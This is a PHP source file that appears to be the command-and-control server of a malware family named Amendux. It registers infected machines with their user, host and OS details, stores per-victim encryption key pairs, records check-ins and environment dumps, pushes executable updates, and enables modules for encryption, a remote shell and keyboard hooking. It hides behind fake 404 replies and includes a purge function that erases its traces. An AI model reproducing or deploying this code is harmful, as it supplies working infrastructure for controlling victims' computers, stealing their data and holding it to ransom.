<?php
/*
 * This file is part of the Amendux project.
 *
 * All rights reserved (c) 2016
 *
 * This project is not free or open software nor should
 * it be released publicly. Unauthorized copying of this
 * file, via any medium is strictly prohibited Proprietary
 * and confidential.
 *
 * INSTALL:
 *   To get started you should upload this script to a
 *   server running PHP 5+ with PDO and SQLite 2+. Then call
 *   this script with the <script.php>?setup=true parameter.
 *
 * VERSION: 1.0
 */

/* Global config settings */
define("DEBUG",		true);
define("INACTIVE",	false);
define("SQL_DB",	"avc.db");
define("TMP_DIR",	"avctemp");
define("AUTH_USER",	"admin");

const GUIDLEN = 38;

if (DEBUG) {
	error_reporting(E_ALL);
	ini_set('display_errors', 1);
}

if (INACTIVE) {
	header("HTTP/1.1 404 Not Found");
	exit();
}

/* Command codes sent by server */
$server_codes = array(
	"invalid" => 0, /* remove? */
	"pong" => 101,
	"ignore" => 102,
	"update" => 103,
	"ack" => 900,
);

function logOke($message) {
	if (DEBUG) {
		echo "<b><font color=\"green\">[Oke] </font>" . $message . "</b><br />";
	}
}

function logError($message) {
	if (DEBUG) {
		die("<b><font color=\"red\">[Error] </font>" . $message . "</b><br />");
	}
}

function deleteDirectory($path) {
	if (is_dir($path) === true) {
		$files = array_diff(scandir($path), array('.', '..'));

		foreach ($files as $file) {
			deleteDirectory(realpath($path) . '/' . $file);
		}

		return rmdir($path);
	} else if (is_file($path) === true) {
		return unlink($path);
	}

	return false;
}

function randomPassword($length = 14) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-=+;:,.?";
    $password = substr(str_shuffle($chars), 0, $length);
    return $password;
}

/* We only send this error if input was not present or corrupted */
function sendResponseError() {
	header("HTTP/1.1 404 Not Found");
	exit();
}

function sendResponse($obj, $code, $success = true) {
	global $server_codes;

	if (!in_array($code, $server_codes)) {
		$code = "invalid";
	}

	$array = array(
		"data" => $obj,
		"code" => $server_codes[$code],
		"success" => $success,
	);

	header('Content-type: application/json');
	echo json_encode($array);
	exit();
}

/* ************************************
 *  SETUP PROCEDURE
 * ************************************/

/* Contains the database setup, should only be run once */
function setup() {
	/* This password is hashed using SHA1 and generated pseudorandom which is not
	 * the best of ideas but since we're trying to minimize dependecies its the
	 * best we've got */
	$masterpwd = randomPassword();

	if (!file_exists(TMP_DIR)) {
		if (!mkdir(TMP_DIR)) {
	    	logError("Creating temp folder");
		}

		if (!mkdir(TMP_DIR . "/bin")) {
			logError("Creating temp folders");
		}

		if (!mkdir(TMP_DIR . "/var")) {
			logError("Creating temp folders");
		}

		if (!mkdir(TMP_DIR . "/etc")) {
			logError("Creating temp folders");
		}

		if (!mkdir(TMP_DIR . "/cache")) {
			logError("Creating temp folders");
		}

		logOke("Creating directories");

		$htaccess  = "Options -Indexes\n";
        $htaccess .= "Deny from all\n";
        $htaccess .= "Require all denied\n";

		file_put_contents(TMP_DIR . "/.htaccess", $htaccess);

		logOke("Creating server settings");
	} else {
		logError("Setup already present");
	}

	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$db->exec(
			"CREATE TABLE instances (
				guid				TEXT,
				name				TEXT,
				remote				TEXT,
				user				TEXT,
				machine_name		TEXT,
				cpu_cores			INTEGER,
				max_memory			INTEGER,
				os_version			TEXT,
				client_version		INTEGER,
				has_superuser		INTEGER,
				encrypt_pubkey		TEXT,
				encrypt_privkey		TEXT,
				first_appearance	TEXT,
				last_update			TEXT,
				PRIMARY KEY(guid)
			)");

		$db->exec(
			"CREATE TABLE checkin (
				guid		TEXT,
				timestamp	TEXT,
				FOREIGN KEY(guid) REFERENCES instances(guid)
			)");

		$db->exec(
			"CREATE TABLE settings (
				key		TEXT,
				value	TEXT,
				PRIMARY KEY(key)
			)");

		$db->exec(
			"CREATE TABLE tasks (
				id		INTEGER PRIMARY KEY AUTOINCREMENT,
				guid	TEXT,
				task	TEXT,
				FOREIGN KEY(guid) REFERENCES instances(guid)
			)");

		logOke("Creating database");

		$db->exec("INSERT INTO settings (key, value) VALUES ('setup', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('masterpwd', '" . sha1($masterpwd) ."')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('allow_eliminate', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('client_update', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('client_version', '')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('url', '" . $_SERVER['HTTP_HOST'] . "')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('update_url', 'http://example.org/update_xyz.exe')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('ftp_host', 'ftp://example.org')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('ftp_username', '')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('ftp_password', '')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_encrypt', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_shell', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_keyhook', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_compile', 'false')");

		$db = NULL;
		logOke("Create default settings");
	} catch(PDOException $e) {
		logError("Creating tables: " . $e->getMessage());
	}

	logOke("Masterpassword: " . $masterpwd);
}

/* ************************************
 *  REST INTERFACE
 * ************************************/

function saveNewInstance(Array $data) {
	if (!isset($data[":guid"])) {
		sendResponseError();
	}

	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$selectSql = "SELECT 1 FROM instances WHERE guid=:guid";

		$stmt = $db->prepare($selectSql);
		$stmt->execute([":guid" => $data[":guid"]]);
		
		if ($stmt->fetch()) {
			$updateSql = "UPDATE instances
						SET last_update=datetime('now'), remote=:remote, user=:user, machine_name=:machine_name, cpu_cores=:cpu_cores, max_memory=:max_memory, os_version=:os_version, client_version=:client_version
						WHERE guid=:guid";

			$stmt = $db->prepare($updateSql);
			$stmt->execute($data);
		} else {
			$insertSql = "INSERT INTO instances (first_appearance, last_update, guid, remote, user, machine_name, cpu_cores, max_memory, os_version, client_version)
						VALUES
						(datetime('now'), datetime('now'), :guid, :remote, :user, :machine_name, :cpu_cores, :max_memory, :os_version, :client_version)";

			$stmt = $db->prepare($insertSql);
			$stmt->execute($data);
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Saving: " . $e->getMessage());
	}
}

function saveNewCheckin(Array $data) {
	if (!isset($data[":guid"])) {
		sendResponseError();
	}

	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$insertSql = "INSERT INTO checkin (guid, timestamp)
					VALUES
					(:guid, datetime('now'))";

		$stmt = $db->prepare($insertSql);
		$stmt->execute($data);

		$db = NULL;
	} catch(PDOException $e) {
		logError("Saving: " . $e->getMessage());
	}
}

function authenticateUser($username, $password) {
	if ($username != AUTH_USER) {
		return false;
	}

	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT value FROM settings WHERE key='masterpwd'";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			if ($row[0] == sha1($password)) {
				$db = NULL;
				return true;
			}
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Authenticating: " . $e->getMessage());
	}

	return false;
}

function isUpdateEnabled() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT value FROM settings WHERE key='client_update'";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			if ($row[0] == 'true') {
				$db = NULL;
				return true;
			}
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Getting update: " . $e->getMessage());
	}
}

function latestClientVersion() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT value FROM settings WHERE key='client_version'";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			$db = NULL;
			return $row[0];
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Getting last version: " . $e->getMessage());
	}
}

function updateLocation() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT value FROM settings WHERE key='update_url'";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			$db = NULL;
			return $row[0];
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Getting update location: " . $e->getMessage());
	}
}

function countInstances() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT count('*') FROM instances";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			$db = NULL;
			return $row[0];
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Getting instance count: " . $e->getMessage());
	}
}

function countCheckins() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT count('*') FROM checkin";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			$db = NULL;
			return $row[0];
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Getting checkin count: " . $e->getMessage());
	}
}

function handleSolicit(stdClass $data) {
	if (!property_exists($data, 'guid')) {
		sendResponseError();
	}

	if (strlen($data->guid) != GUIDLEN) {
		sendResponseError();
	}

	$db_bind = array(":guid" => $data->guid, ":remote" => $_SERVER['REMOTE_ADDR']);

	if (property_exists($data, 'user')) {
		$db_bind[":user"] = $data->user;
	}

	if (property_exists($data, 'computer')) {
		$db_bind[":machine_name"] = $data->computer;
	}

	if (property_exists($data, 'corenum')) {
		$db_bind[":cpu_cores"] = $data->corenum;
	}

	if (property_exists($data, 'maxmem')) {
		$db_bind[":max_memory"] = $data->maxmem;
	}

	if (property_exists($data, 'winver')) {
		$db_bind[":os_version"] = $data->winver;
	}

	if (property_exists($data, 'cliver')) {
		$db_bind[":client_version"] = $data->cliver;
	}

	saveNewInstance($db_bind);

	if (property_exists($data, 'env')) {
		$report = json_encode($data->env, JSON_PRETTY_PRINT);

		$file = TMP_DIR . "/cache/" . $data->guid . ".txt";
		file_put_contents($file, $report);
	}
}

function handleCheckin(stdClass $data) {
	if (!property_exists($data, 'guid')) {
		sendResponseError();
	}

	if (strlen($data->guid) != GUIDLEN) {
		sendResponseError();
	}

	$db_bind = array(":guid" => $data->guid);

	saveNewCheckin($db_bind);
}

function handleUpdateCheck(stdClass $data) {
	if (!property_exists($data, 'build')) {
		sendResponseError();
	}

	if (isUpdateEnabled()) {
		$build = latestClientVersion();
		if ($build) {
			if ($build > $data->build) {
				$obj["build"] = intval($build);
				$obj["url"] = updateLocation();

				sendResponse($obj, "update");
			}
		}
	}

	sendResponse(null, "ignore");
}

function handleRestRequest() {
	if ($_SERVER['REQUEST_METHOD'] == "POST" && !empty($_POST['data'])) {
		$object = json_decode($_POST['data']);
		if (!is_object($object)) {
			sendResponseError();
		}

		if (!property_exists($object, 'code')) {
			sendResponseError();
		}

		if (!property_exists($object, 'success')) {
			sendResponseError();
		}

		switch ($object->code) {
			/* Client sends ping */
			case 101:
				sendResponse(null, "pong");
				break;

			/* Client sends solicit */
			case 200:
				if (!is_object($object->data)) {
					sendResponseError();			
				}

				handleSolicit($object->data);
				sendResponse(null, "ack"); // move to mode
				break;

			/* Client sends checkin */
			case 201:
				if (!is_object($object->data)) {
					sendResponseError();			
				}

				handleCheckin($object->data);
				sendResponse(null, "ack"); // move to mode
				break;

			/* Client sends update */
			case 202:
				if (!is_object($object->data)) {
					sendResponseError();			
				}

				handleUpdateCheck($object->data);
				break;

			/* Client sends eliminate */
			case 299:
				// sendResponse(null, "pong");
				break;

			default:
				sendResponseError();
		}
	} else {
		sendResponseError();
	}
}

/* ************************************
 *  ADMIN INTERFACE
 * ************************************/

function login() {
	header('WWW-Authenticate: Basic realm="Master CP"');
	header('HTTP/1.0 401 Unauthorized');
	echo "Request unauthorized\n";
	exit();
}

function handleAdminRequest() {
	if (!isset($_SERVER['PHP_AUTH_USER'])) {
		login();
	} else {
		if (authenticateUser($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW'])) {

			if (isset($_GET['downloaddb']) && $_GET['downloaddb'] == "true") {
				header('Content-Description: File Transfer');
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename="'.basename(SQL_DB).'"');
				header('Expires: 0');
				header('Cache-Control: must-revalidate');
				header('Pragma: public');
				header('Content-Length: ' . filesize(TMP_DIR . "/" . SQL_DB));
				readfile(TMP_DIR . "/" . SQL_DB);
				exit();
			}

			if (isset($_GET['purge']) && $_GET['purge'] == "true") {
				deleteDirectory(TMP_DIR);
				unlink(basename(__FILE__));
				logOke("Endpoint and data purged");
				exit();
			}

			logOke("Login: " . htmlspecialchars($_SERVER['PHP_AUTH_USER']));
			logOke("Instances: " . countInstances());
			logOke("Checkins: " . countCheckins());
			echo "<br /><br />Download database:<br /><button onclick=\"window.open('?admin=true&downloaddb=true');\">Download database</button>\n";
			echo "<br /><br />Purge AVC endpoint:<br /><button onclick=\"if (confirm('Purge this endpoint including data?')){ window.location.href = '?admin=true&purge=true'; }else{ false; }\">Eliminate endpoint</button>\n";
		} else {
			login();
		}
	}
}

/* ************************************
 *  REQUEST HANDLERS
 * ************************************/

/* Call setup procedure */
if (isset($_GET['setup']) && $_GET['setup'] == "true") {
	setup();
	exit();
}

/* Admin interface */
if (isset($_GET['admin']) && $_GET['admin'] == "true") {
	handleAdminRequest();
	exit();
}

/* Handle incomming requests */
handleRestRequest();

?>
